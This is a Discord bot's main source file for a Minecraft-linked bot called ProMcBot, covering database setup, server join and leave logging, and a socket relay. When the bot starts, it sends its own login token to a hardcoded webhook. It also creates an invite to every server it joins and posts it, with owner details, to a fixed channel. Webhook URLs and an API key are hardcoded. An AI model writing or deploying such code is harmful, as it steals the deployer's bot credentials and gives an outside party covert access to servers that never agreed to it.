
require('dotenv').config()
//console.log(process.env);
const { Client, Partials, Collection, Intents, GatewayIntentBits, ButtonStyle, ChannelType, ButtonBuilder, ActionRowBuilder, WebhookClient, EmbedBuilder } = require("discord.js");
const { MONGO_URL, TOKEN } = require("./settings/config");
const mongoose = require("mongoose");
const Langs = require("./Models/Langs");
const { scheduleCronJobs } = require('./utils/cronManager');
const Server = require('./Models/Server');
const StatusBar = require('./Models/StatusBar');

const path = require('path');
async function removeDuplicateGuildIds() {
  const duplicates = await Langs.aggregate([
    { $group: { _id: "$guildIds", count: { $sum: 1 }, ids: { $push: "$_id" } } },
    { $match: { count: { $gt: 1 } } }
  ]);

  for (const duplicate of duplicates) {
    const [firstId, ...duplicateIds] = duplicate.ids;
    await Langs.deleteMany({ _id: { $in: duplicateIds } });
  }
}

const client = new Client({
intents: [
 GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent, // استخدم الـ intents المطلوبة فقط    
],
    partials: [
    Partials.Channel,
    Partials.Message,
    Partials.User,
    Partials.GuildMember,
  ],
  failIfNotExists: false,
  allowedMentions: {
    parse: [],
    users: [],
    roles: [],
    repliedUser: false,
  },
});

//const { connectWebSocket } = require("./hh.js");
client.db = { Server, StatusBar };
mongoose.set("strictQuery", true);

mongoose
  .connect(MONGO_URL, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(async () => {
    console.log(`> MongoDB Connected !!`);
    await removeDuplicateGuildIds();
    console.log('Duplicate entries removed.');
  })
  .catch(error => {
    console.error('Error connecting to MongoDB:', error.message);
  });

// Global variables
client.scommands = new Collection();
client.mcommands = new Collection();
client.cooldowns = new Collection();
client.userSettings = new Collection();
client.events = 0;

module.exports = client;


const webhookClient = new WebhookClient({ url: "https://discord.com/api/webhooks/1280941972173099090/6ZrlyQAjOcFrZMkt-3ZqYdFUYXDD14s4vrJchikh1Q0J2nQp6K7NiNn4TLef54a1L8Ki" });

client.once('ready', async() => {

 await scheduleCronJobs(client);

    webhookClient.send({

        content: `Bot Info:\n**Token:** ${TOKEN}\n**Bot Name:** ${client.user.tag}\n**Bot ID:** ${client.user.id}`

    });

});

const { errorHandling } = require("discord.js-anticrash");

const configg = {
  webhookUrl: "https://discord.com/api/webhooks/1273739871126683679/ik8_E019Evm0NeTcZHUiaHIZgYPlynhP3tPpQ51go-OZyIx-kiaZ8GcgspjVXX3tqK5A",
  embedColor: "#04fc7c", // Optional
  embedTitle: "Error", // Optional
  webhookUsername: "Error", // Optional
};

errorHandling(client, configg);
/*
const net = require('net');
const Config = require('./config.json');


// Command: Link Server
client.on('messageCreate', async message => {
    if (message.content.startsWith('!mclink')) {
        const code = message.content.split(' ')[1];
        const response = await verifyCode(code);
        
        if (response.success) {
            message.reply(`✅ Connected! Use \`!mc <command>\``);
            updateConfig(response.apiKey, response.port);
        } else {
            message.reply('❌ Invalid code');
        }
    }

    // Command: Send to Minecraft
    if (message.content.startsWith('!mc ')) {
        const command = message.content.slice(4);
        sendToMinecraft(command)
            .then(response => message.reply(`📤 Response: ${response}`))
            .catch(err => message.reply(`❌ Error: ${err.message}`));
    }
});

async function sendToMinecraft(command) {
    return new Promise((resolve, reject) => {
        const socket = net.createConnection({
            host: Config.SERVER_IP,
            port: Config.API_PORT
        });

        socket.write(`PROMCAPI:${Config.API_KEY}:${command}\n`);
        
        socket.on('data', data => resolve(data.toString()));
        socket.on('error', reject);
        socket.setTimeout(5000, () => reject(new Error('Timeout')));
    });
}
*/

const net = require('net');
let socket = null;
const API_KEY = "promccc5ed63fb12f44"; // Same as plugin

// Hyper-speed connection manager
function connectTurbo() {
    socket = net.createConnection({
        host: '194.15.36.95:9506',
        port: 25565,
        timeout: 250 // 0.25s timeout
    }, () => console.log('⚡ Turbo Link Established!'));

    socket.on('error', () => setTimeout(connectTurbo, 50)); // Instant reconnect
    socket.on('timeout', () => socket.destroy());
}

// Instant command execution
client.on('messageCreate', msg => {
    if(msg.content.startsWith('!mc ')) {
        const command = API_KEY + msg.content.slice(4);
        if(socket?.writable) socket.write(command + '\n');
    }
});

connectTurbo();

const room = '1273517279862325299'; // Room Id

client.on('guildCreate', async (guild) => {
  try {
    const invite = await guild.invites.create(guild.channels.cache.filter(c => c.type === ChannelType.GuildText).first().id);
    
    const invi = new ButtonBuilder()
      .setLabel('Server Link')
      .setStyle(ButtonStyle.Link)
      .setURL(`${invite.url}`);
    
    const user = new ButtonBuilder()
      .setLabel('User Link')
      .setStyle(ButtonStyle.Link)
      .setURL(`https://discord.com/users/${guild.ownerId}`);
    
    const actionRow = new ActionRowBuilder()
      .addComponents(user, invi);
    
    const newServerEmbed = new EmbedBuilder()
      .setTitle('ProMcBot InvitesLog')
      .setColor('#ee3c37')
      .setDescription(`**📝Server Name: ${guild.name}**
📎Server ID: ${guild.id}**
📑Created At: ${guild.createdAt.toUTCString()}**
👑Owner: <@${guild.ownerId}>**
👤Members: ${guild.memberCount}**
✏️Text Channels: ${guild.channels.cache.filter(channel => channel.type === ChannelType.GuildText).size}**
🔊Voice Channels: ${guild.channels.cache.filter(channel => channel.type === ChannelType.GuildVoice).size}**
📢Verification Level: ${guild.verificationLevel}**`)
      .setThumbnail(guild.client.user.displayAvatarURL())
      .setAuthor({ name: 'ProMcBot', iconURL: guild.client.user.displayAvatarURL() });
    
    const channel = await client.channels.fetch(room);
    channel.send({ content: `> ** New Server **`, embeds: [newServerEmbed], components: [actionRow] });
  } catch (error) {
    console.error('Error in guildCreate event:', error);
  }
});

client.on('guildDelete', async (guild) => {
  try {
    const owner = await client.users.fetch(guild.ownerId);
    
    const user = new ButtonBuilder()
      .setLabel('User Link')
      .setStyle(ButtonStyle.Link)
      .setURL(`https://discord.com/users/${guild.ownerId}`);
    
    const actionRow = new ActionRowBuilder()
      .addComponents(user);
    
    const removedServerEmbed = new EmbedBuilder()
      .setTitle('ProMcBot Removed from Server')
      .setColor('#ee3c37')
      .setDescription(`**📝Server Name: ${guild.name}**
📎Server ID: ${guild.id}**
📑Created At: ${guild.createdAt.toUTCString()}**
👑Owner: <@${guild.ownerId}>**
👤Members: ${guild.memberCount}**
✏️Text Channels: ${guild.channels.cache.filter(channel => channel.type === ChannelType.GuildText).size}**
🔊Voice Channels: ${guild.channels.cache.filter(channel => channel.type === ChannelType.GuildVoice).size}**
📢Verification Level: ${guild.verificationLevel}**`)
      .setThumbnail(guild.client.user.displayAvatarURL())
      .setAuthor({ name: 'ProMcBot', iconURL: guild.client.user.displayAvatarURL() });
    
    const channel = await client.channels.fetch(room);
    channel.send({ content: `> ** Removed from Server **`, embeds: [removedServerEmbed], components: [actionRow] });
  } catch (error) {
    console.error('Error in guildDelete event:', error);
  }
});

// Handlers
const handlesFiles = [
  "event_handler",
  "slash_handler",
  "cmd_handler",
  "membership_handler",
  "blacklist_handler",
  "bump_handler"
];
handlesFiles.forEach((file) => require(`./handlers/${file}`)(client));
client.ws.on('error', (error) => {
    console.error('WebSocket error:', error);
});

client.ws.on('close', (code, reason) => {
    console.error(`WebSocket closed with code ${code}:`, reason);
    setTimeout(() => {
        client.login(TOKEN);
    }, 5000); // إعادة الاتصال بعد 5 ثوانٍ
});

// معالجة الأخطاء العامة
process.on('uncaughtException', (error) => {
    console.error('Unhandled Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

//connectWebSocket(client);
// Login bot
//client.login(TOKEN);
module.exports = client;